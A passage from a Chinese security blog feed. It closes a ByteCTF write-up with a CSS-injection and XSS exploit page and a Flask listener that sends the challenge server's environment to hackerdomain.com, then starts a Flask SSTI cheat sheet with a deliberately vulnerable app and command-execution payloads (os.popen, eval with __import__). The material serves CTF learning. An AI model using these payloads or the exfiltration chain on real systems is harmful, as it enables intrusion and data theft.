class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    prevent page recycle<br>    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://deelay.me/50000/https://picsum.photos/200/300&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"></span><br><span class="javascript">    <span class="hljs-keyword">let</span> after_command =</span><br><span class="javascript">        <span class="hljs-built_in">encodeURIComponent</span>(</span><br><span class="javascript">            <span class="hljs-string">`fetch(&#x27;http://127.0.0.1:13002/status?cmd=env&#x27;).then(r=&gt;r.text().then(t=&gt;fetch(&#x27;https://www.hackerdomain.com/ctftest/setword/&#x27;+encodeURIComponent(t))));`</span></span><br><span class="javascript">        );</span><br><span class="javascript">    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">window</span>.location.href.indexOf(<span class="hljs-string">&quot;www.hackerdomain.com&quot;</span>) == -<span class="hljs-number">1</span>) &#123; <span class="hljs-comment">//local testing</span></span><br><span class="javascript">        <span class="hljs-keyword">var</span> server = <span class="hljs-string">&quot;https://a71f2c55a775f55f23d7ccaf62f36fe0.2022.capturetheflag.fun&quot;</span></span><br><span class="javascript">    &#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">//打远程</span></span><br><span class="javascript">        <span class="hljs-keyword">var</span> server = <span class="hljs-string">&quot;http://127.0.0.1:13002&quot;</span></span><br><span class="javascript">    &#125;</span><br><span class="javascript">    <span class="hljs-keyword">let</span> base_url = server + <span class="hljs-string">&quot;/?color=red;&#125;&quot;</span>+</span><br><span class="javascript">                            <span class="hljs-string">&quot;%0a.container%20embed[src^=web]&#123;background-image:url(https://www.hackerdomain.com/ctftest/setword/web);&#125;&quot;</span> + </span><br><span class="javascript">                            <span class="hljs-string">&quot;%0a.container%20embed[src^=bytedance]&#123;background:url(https://www.hackerdomain.com/ctftest/setword/bytedance);&#125;&quot;</span>+</span><br><span class="javascript">                            <span class="hljs-string">&quot;%0a.container%20embed[src^=ctf]&#123;background:url(https://www.hackerdomain.com/ctftest/setword/ctf);&#125;&quot;</span> +</span><br><span class="javascript">                            <span class="hljs-string">&quot;%0a.container%20embed[src^=sing]&#123;background:url(https://www.hackerdomain.com/ctftest/setword/sing);&#125;&quot;</span> +</span><br><span class="javascript">                            <span class="hljs-string">&quot;%0a.container%20embed[src^=jump]&#123;background:url(https://www.hackerdomain.com/ctftest/setword/jump);&#125;&quot;</span> + </span><br><span class="javascript">                            <span class="hljs-string">&quot;%0a.container%20embed[src^=rap]&#123;background:url(https://www.hackerdomain.com/ctftest/setword/rap);&#125;&quot;</span>+</span><br><span class="javascript">                            <span class="hljs-string">&quot;%0a.container%20embed[src^=basketball]&#123;background:url(https://www.hackerdomain.com/ctftest/setword/basketball);&#125;&quot;</span>+</span><br><span class="javascript">                            <span class="hljs-string">&quot;%0a.container%20embed[src^=hello]&#123;background:url(https://www.hackerdomain.com/ctftest/setword/hello);&#125;&quot;</span>+</span><br><span class="javascript">                            <span class="hljs-string">&quot;%0a.container%20embed[src^=world]&#123;background:url(https://www.hackerdomain.com/ctftest/setword/world);&#125;&quot;</span>+</span><br><span class="javascript">                            <span class="hljs-string">&quot;%0a.container%20embed[src^=fighting]&#123;background:url(https://www.hackerdomain.com/ctftest/setword/fighting);&#125;&quot;</span>+</span><br><span class="javascript">                            <span class="hljs-string">&quot;%0a.container%20embed[src^=flag]&#123;background:url(https://www.hackerdomain.com/ctftest/setword/flag);&#125;&quot;</span> + </span><br><span class="javascript">                            <span class="hljs-string">&quot;%0a.container%20embed[src^=game]&#123;background:url(https://www.hackerdomain.com/ctftest/setword/game);&#125;&quot;</span>+</span><br><span class="javascript">                            <span class="hljs-string">&quot;%0a.container%20embed[src^=happy]&#123;background:url(https://www.hackerdomain.com/ctftest/setword/happy);&#125;&quot;</span>+</span><br><span class="javascript">                            <span class="hljs-string">&quot;x&#123;&quot;</span> + </span><br><span class="javascript">                            <span class="hljs-string">&quot;&amp;name=&lt;img src=x onerror=\&quot;fetch(&#x27;https://www.hackerdomain.com/ctftest/setword/xss_done&#x27;);&quot;</span> + after_command + <span class="hljs-string">&quot;\&quot; /&gt;#&quot;</span></span><br><span class="javascript"></span><br><span class="javascript">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">create_window</span>(<span class="hljs-params"></span>) </span>&#123;</span><br><span class="javascript">        <span class="hljs-keyword">let</span> w = open(base_url)</span><br><span class="javascript">        <span class="hljs-keyword">return</span> w</span><br><span class="javascript"></span><br><span class="javascript">    &#125;</span><br><span class="javascript">    ended = <span class="hljs-literal">false</span></span><br><span class="javascript"></span><br><span class="javascript">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_word</span>(<span class="hljs-params"></span>) </span>&#123;</span><br><span class="javascript">        <span class="hljs-keyword">if</span> (ended) &#123;</span><br><span class="javascript">            <span class="hljs-keyword">return</span></span><br><span class="javascript">        &#125;</span><br><span class="javascript">        <span class="hljs-comment">//获取到当前答案</span></span><br><span class="javascript">        fetch(<span class="hljs-string">&quot;https://www.hackerdomain.com/ctftest/getword&quot;</span>).then(<span class="hljs-function"><span class="hljs-params">r</span> =&gt;</span> r.text().then(<span class="hljs-function"><span class="hljs-params">x</span> =&gt;</span> &#123;</span><br><span class="javascript">            <span class="hljs-keyword">if</span> (x == <span class="hljs-string">&quot;xss_done&quot;</span>) &#123;</span><br><span class="javascript">                ended = <span class="hljs-literal">true</span></span><br><span class="javascript">                <span class="hljs-keyword">return</span></span><br><span class="javascript">            &#125;</span><br><span class="javascript">            <span class="hljs-keyword">if</span> (x == <span class="hljs-string">&quot;&quot;</span>) &#123;</span><br><span class="javascript">                <span class="hljs-keyword">return</span>;</span><br><span class="javascript">            &#125; <span class="hljs-keyword">else</span> &#123;</span><br><span class="javascript">                <span class="hljs-comment">//修改href,提交答案</span></span><br><span class="javascript">                <span class="hljs-built_in">window</span>.vuln_window.location.href = base_url + x;</span><br><span class="javascript">            &#125;</span><br><span class="javascript">        &#125;));</span><br><span class="javascript">    &#125;</span><br><span class="javascript"></span><br><span class="javascript">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">main</span>(<span class="hljs-params"></span>) </span>&#123;</span><br><span class="javascript">        <span class="hljs-comment">//clear old word</span></span><br><span class="javascript">        fetch(<span class="hljs-string">&quot;https://www.hackerdomain.com/ctftest/getword&quot;</span>)</span><br><span class="javascript">        <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;</span><br><span class="javascript">            <span class="hljs-comment">// 创建窗口，自动化解题</span></span><br><span class="javascript">            <span class="hljs-built_in">window</span>.vuln_window = create_window()</span><br><span class="javascript">            <span class="hljs-built_in">setInterval</span>(get_word, <span class="hljs-number">500</span>);</span><br><span class="javascript">        &#125;, <span class="hljs-number">500</span>);</span><br><span class="javascript">        <span class="hljs-comment">//prevent window being recycled</span></span><br><span class="javascript">        <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;</span><br><span class="javascript">            <span class="hljs-built_in">console</span>.log(<span class="hljs-number">1</span>)</span><br><span class="javascript">        &#125;, <span class="hljs-number">1000</span>)</span><br><span class="javascript">        <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;</span><br><span class="javascript">            <span class="hljs-built_in">console</span>.log(<span class="hljs-number">1</span>)</span><br><span class="javascript">        &#125;, <span class="hljs-number">10000</span>)</span><br><span class="javascript">        <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;</span><br><span class="javascript">            <span class="hljs-built_in">console</span>.log(<span class="hljs-number">1</span>)</span><br><span class="javascript">        &#125;, <span class="hljs-number">20000</span>)</span><br><span class="javascript"></span><br><span class="javascript">    &#125;</span><br><span class="javascript">    main()</span><br><span class="javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,abort<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.after_request</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">after_request</span>(<span class="hljs-params">response</span>):</span><br>  response.headers.add(<span class="hljs-string">&#x27;Access-Control-Allow-Origin&#x27;</span>, <span class="hljs-string">&#x27;*&#x27;</span>)<br>  response.headers.add(<span class="hljs-string">&#x27;Access-Control-Allow-Headers&#x27;</span>, <span class="hljs-string">&#x27;Content-Type,Authorization&#x27;</span>)<br>  response.headers.add(<span class="hljs-string">&#x27;Access-Control-Allow-Methods&#x27;</span>, <span class="hljs-string">&#x27;GET,PUT,POST,DELETE,OPTIONS&#x27;</span>)<br>  <span class="hljs-keyword">return</span> response<br><br>word = <span class="hljs-literal">None</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/ctftest/setword/&lt;lword&gt;&quot;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">hello</span>(<span class="hljs-params">lword</span>):</span><br>    <span class="hljs-keyword">global</span> word<br>    word = lword<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;word is&quot;</span>,word)<br>    abort(<span class="hljs-number">404</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/ctftest/getword&quot;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getword</span>():</span><br>    <span class="hljs-keyword">global</span> word<br>    <span class="hljs-keyword">if</span> word <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span><br>    lword = word<br>    word = <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">return</span> lword<br><br><span class="hljs-comment"># 建议部署https</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>,port=<span class="hljs-number">7099</span>)<br></code></pre></td></tr></table></figure><h4 id="我的总结-2">我的总结</h4><p>这道题赛后分析看起来还是思路比较清楚的，但是要求的水平还是比较高的。这也是第一次复盘这么复杂的题目，整体的手段环环相扣，重点还是利用同源策略分析出要从name处实现XSS，然后再利用CSS注入实现自动化做题。</p><p>还是分析的能力偏弱，同时XSS也是我的薄弱项，中间花了不少时间去学习同源策略，但是学习到了非常多。</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>Games</category>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>wp</tag>
      
      <tag>ByteCTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Flask-SSTI利用总结</title>
    <link href="/2022/05/06/blog0019-Flask-SSTI%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/"/>
    <url>/2022/05/06/blog0019-Flask-SSTI%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p>SSTI，模板引擎注入，主要是利用模板引擎的不正确解析，从而造成信息泄露乃至代码执行等问题。由于涉及到代码执行，因此也常常会和pyjail等沙箱问题一起考察。</p><p>这一篇结合ctfshow 的SSTI靶场简单总结一下Python SSTI的技巧和绕过思路。</p><span id="more"></span><h2 id="flask相关知识">flask相关知识</h2><h3 id="漏洞代码">漏洞代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template, request, render_template_string<br><br>app = Flask(__name__)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sb</span>():</span><br>    template = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">        &lt;div class=&quot;center-content error&quot;&gt;</span><br><span class="hljs-string">            &lt;h1&gt;This is ssti! %s&lt;/h1&gt;</span><br><span class="hljs-string">        &lt;/div&gt;</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span> % request.args[<span class="hljs-string">&quot;x&quot;</span>]<br><br>    <span class="hljs-keyword">return</span> render_template_string(template)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.debug = <span class="hljs-literal">True</span><br>    app.run()<br></code></pre></td></tr></table></figure><h3 id="模板相关">模板相关</h3><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs clean">变量块 &#123;&#123;&#125;&#125;用于将表达式打印到模板输出<br>注释块 &#123;##&#125;注释<br>控制块&#123;%%&#125;可以声明变量，也可以执行语句<br>行声明##可以有和&#123;%%&#125;相同的效果<br></code></pre></td></tr></table></figure><h3 id="内置类和函数">内置类和函数</h3><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="xml">Flask内置函数和内置对象可以通过</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">self.__dict__._TemplateReference__context.keys</span>()&#125;&#125;</span><span class="xml">查看，然后可以查看一下这几个东西的类型，类可以通过__init__方法跳到os，函数直接用__globals__方法跳到os。（payload一下子就简洁了）</span><br><span class="xml"></span><br><span class="xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">self.__dict__._TemplateReference__context.keys</span>()&#125;&#125;</span><span class="xml"></span><br><span class="xml">#查看内置函数</span><br><span class="xml">#函数：lipsum、url_for、get_flashed_messages</span><br><span class="xml">#类：cycler、joiner、namespace、config、request、session</span><br><span class="xml"></span><br><span class="xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">lipsum.__globals__.os.popen</span>(<span class="hljs-name">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><span class="xml"></span><br><span class="xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">cycler.__init__.__globals__.os.popen</span>(<span class="hljs-name">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure><h3 id="常用方法">常用方法</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs stylus">__class__           查看对象所在的类<br>__mro__             查看继承关系和调用顺序，返回元组<br>__base__            返回基类<br>__bases__           返回基类元组<br>__subclasses__()    返回子类列表<br>__init__            调用初始化函数，可以用来跳到__globals__<br>__globals__         返回函数所在的全局命名空间所定义的全局变量，返回字典<br>__builtins__        返回内建内建名称空间字典<br>__dict__            类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里<br>__getattribute__()   实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如:<span class="hljs-selector-tag">a</span>.xxx/<span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.xxx</span>()）都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。<br>__getitem__()       调用字典中的键值，其实就是调用这个魔术方法，比如<span class="hljs-selector-tag">a</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;b&#x27;</span>]</span>，就是<span class="hljs-selector-tag">a</span>.__getitem__(<span class="hljs-string">&#x27;b&#x27;</span>)<br><span class="hljs-function"><span class="hljs-title">get</span><span class="hljs-params">()</span></span>通过字典中的键名获取到键值<br><span class="hljs-function"><span class="hljs-title">pop</span><span class="hljs-params">()</span></span>获取列表中的某个元素，移除<br>__builtins__         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。<br>__import__           动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__(<span class="hljs-string">&#x27;os&#x27;</span>)<span class="hljs-selector-class">.popen</span>(<span class="hljs-string">&#x27;ls&#x27;</span>)<span class="hljs-selector-class">.read</span>()]<br>__str__()            返回描写这个对象的字符串，可以理解成就是打印出来。<br><span class="hljs-function"><span class="hljs-title">dict</span><span class="hljs-params">()</span></span> 和join过滤器一起用，可以实现字母数字字符串构造<br>url_for              flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__builtins__&#x27;</span>]</span>含有current_app<br>get_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__builtins__&#x27;</span>]</span>含有current_app<br>lipsum               flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：&#123;&#123;lipsum.__globals__<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;os&#x27;</span>]</span><span class="hljs-selector-class">.popen</span>(<span class="hljs-string">&#x27;ls&#x27;</span>)<span class="hljs-selector-class">.read</span>()&#125;&#125;<br>&#123;&#123;cycler.__init__.__globals__<span class="hljs-selector-class">.os</span><span class="hljs-selector-class">.popen</span>(<span class="hljs-string">&#x27;ls&#x27;</span>)<span class="hljs-selector-class">.read</span>()&#125;&#125;<br>current_app          应用上下文，一个全局变量<br>request              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.__init__.__globals__<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__builtins__&#x27;</span>]</span><span class="hljs-selector-class">.open</span>(<span class="hljs-string">&#x27;/proc\self\fd/3&#x27;</span>)<span class="hljs-selector-class">.read</span>()<br>request<span class="hljs-selector-class">.args</span><span class="hljs-selector-class">.x1</span>    get传参<br>request<span class="hljs-selector-class">.values</span><span class="hljs-selector-class">.x1</span>  所有参数<br>request<span class="hljs-selector-class">.cookies</span>      cookies参数<br>request<span class="hljs-selector-class">.headers</span>      请求头参数<br>request<span class="hljs-selector-class">.form</span><span class="hljs-selector-class">.x1</span>    post传参(Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)<br>request<span class="hljs-selector-class">.data</span>   post传参(Content-Type:a/b)<br>request<span class="hljs-selector-class">.json</span> post传json  (Content-Type: application/json)<br>config               当前application的所有配置。此外，也可以这样&#123;&#123;config.__class__.__init__.__globals__<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;os&#x27;</span>]</span><span class="hljs-selector-class">.popen</span>(<span class="hljs-string">&#x27;ls&#x27;</span>)<span class="hljs-selector-class">.read</span>() &#125;&#125;<br></code></pre></td></tr></table></figure><h3 id="过滤器">过滤器</h3><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs gradle">attr()获取属性 <span class="hljs-string">&#x27;&#x27;</span>.__class__ 等价 <span class="hljs-string">&#x27;&#x27;</span>|attr(<span class="hljs-string">&#x27;__class__&#x27;</span>)<br><br>format() 格式化字符串<span class="hljs-string">&quot;%c%c%c%c%c%c%c%c%c&quot;</span>|format(<span class="hljs-number">95</span>,<span class="hljs-number">95</span>,<span class="hljs-number">99</span>,<span class="hljs-number">108</span>,<span class="hljs-number">97</span>,<span class="hljs-number">115</span>,<span class="hljs-number">115</span>,<span class="hljs-number">95</span>,<span class="hljs-number">95</span>) 等价 <span class="hljs-string">&#x27;__class__&#x27;</span><br><br><span class="hljs-keyword">int</span>()将值转换为<span class="hljs-keyword">int</span>类型；<br><br><span class="hljs-keyword">float</span>()将值转换为<span class="hljs-keyword">float</span>类型；<br><br>lower()将字符串转换为小写；<br><br>upper()将字符串转换为大写；<br><br>title()把值中的每个单词的首字母都转成大写；<br><br>capitalize()把变量值的首字母转成大写，其余字母转小写；<br><br>trim()截取字符串前面和后面的空白字符；<br><br>wordcount()计算一个长字符串中单词的个数；<br><br><span class="hljs-keyword">reverse</span>()字符串反转；<br><br>replace(value,old,<span class="hljs-keyword">new</span>)替换将old替换为<span class="hljs-keyword">new</span>的字符串；<br><br>truncate(value,length=<span class="hljs-number">255</span>,killwords=<span class="hljs-keyword">False</span>)截取length长度的字符串；<br><br>striptags()删除字符串中所有的HTML标签，如果出现多个空格，将替换成一个空格；<br><br>escape()或e转义字符，会将&lt;、&gt;等符号转义成HTML中的符号。显例：content|escape或content|e。<br><br>safe()禁用HTML转义，如果开启了全局转义，那么safe过滤器会将变量关掉转义。示例： &#123;&#123;<span class="hljs-string">&#x27;&lt;em&gt;hello&lt;/em&gt;&#x27;</span>|safe&#125;&#125;；<br><br>list()将变量列成列表；<br><br>string()将变量转换成字符串；<br><br><span class="hljs-keyword">join</span>()将一个序列中的参数值拼接成字符串。<span class="hljs-string">&quot;&quot;</span>[[<span class="hljs-string">&#x27;__clas&#x27;</span>,<span class="hljs-string">&#x27;s__&#x27;</span>]|<span class="hljs-keyword">join</span>] 或者 <span class="hljs-string">&quot;&quot;</span>[(<span class="hljs-string">&#x27;__clas&#x27;</span>,<span class="hljs-string">&#x27;s__&#x27;</span>)|<span class="hljs-keyword">join</span>]<br><br><span class="hljs-keyword">abs</span>()返回一个数值的绝对值；<br><br>first()返回一个序列的第一个元素；<br><br>last()返回一个序列的最后一个元素；<br><br>format(value,arags,*kwargs)格式化字符串。比如：&#123;&#123;<span class="hljs-string">&quot;%s&quot;</span> - <span class="hljs-string">&quot;%s&quot;</span>|format(<span class="hljs-string">&#x27;Hello?&#x27;</span>,<span class="hljs-string">&quot;Foo!&quot;</span>) &#125;&#125;将输出：Helloo? - Foo!<br><br>length()返回一个序列或者字典的长度；<br><br>sum()返回列表内数值的和；<br><br><span class="hljs-keyword">sort</span>()返回排序后的列表；<br><br><span class="hljs-keyword">default</span>(value,default_value,<span class="hljs-keyword">boolean</span>=<span class="hljs-keyword">false</span>)如果当前变量没有值，则会使用参数中的值来代替。示例：name|<span class="hljs-keyword">default</span>(<span class="hljs-string">&#x27;xiaotuo&#x27;</span>)----如果name不存在，则会使用xiaotuo来替代。<span class="hljs-keyword">boolean</span>=<span class="hljs-keyword">False</span>默认是在只有这个变量为undefined的时候才会使用<span class="hljs-keyword">default</span>中的值，如果想使用python的形式判断是否为<span class="hljs-keyword">false</span>，则可以传递<span class="hljs-keyword">boolean</span>=<span class="hljs-keyword">true</span>。也可以使用or来替换。<br><br>length()返回字符串的长度，别名是<span class="hljs-keyword">count</span><br></code></pre></td></tr></table></figure><h3 id="通用链子">通用链子</h3><h4 id="popen链子py3">popen链子（py3）</h4><p>subclasses处的下标需要根据情况确定</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">os._wrap_close 类里有popen<br><br><span class="hljs-string">&quot;&quot;</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__bases__</span>[</span></span><span class="hljs-number">0</span>].<span class="hljs-constructor">__subclasses__()</span><span class="hljs-literal">[<span class="hljs-number">128</span>]</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__init__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__globals__</span>[</span></span>&#x27;popen&#x27;](&#x27;whoami&#x27;).read<span class="hljs-literal">()</span><br><span class="hljs-string">&quot;&quot;</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__bases__</span>[</span></span><span class="hljs-number">0</span>].<span class="hljs-constructor">__subclasses__()</span><span class="hljs-literal">[<span class="hljs-number">128</span>]</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__init__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__globals__</span>.</span></span>popen(&#x27;whoami&#x27;).read<span class="hljs-literal">()</span><br><br></code></pre></td></tr></table></figure><h4 id="builtins__控制链">__builtins__控制链</h4><p>导入python中的内置模块、函数，查找是否存在可利用的方法</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-variable">__builtins__</span>下有eval，<span class="hljs-variable">__import__</span>等的函数，可以利用此来执行命令<br><br><span class="hljs-string">&quot;&quot;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__bases__</span>[<span class="hljs-number">0</span>].<span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">250</span>].<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>)<br><span class="hljs-string">&quot;&quot;</span>.<span class="hljs-variable">__class__</span>.<span 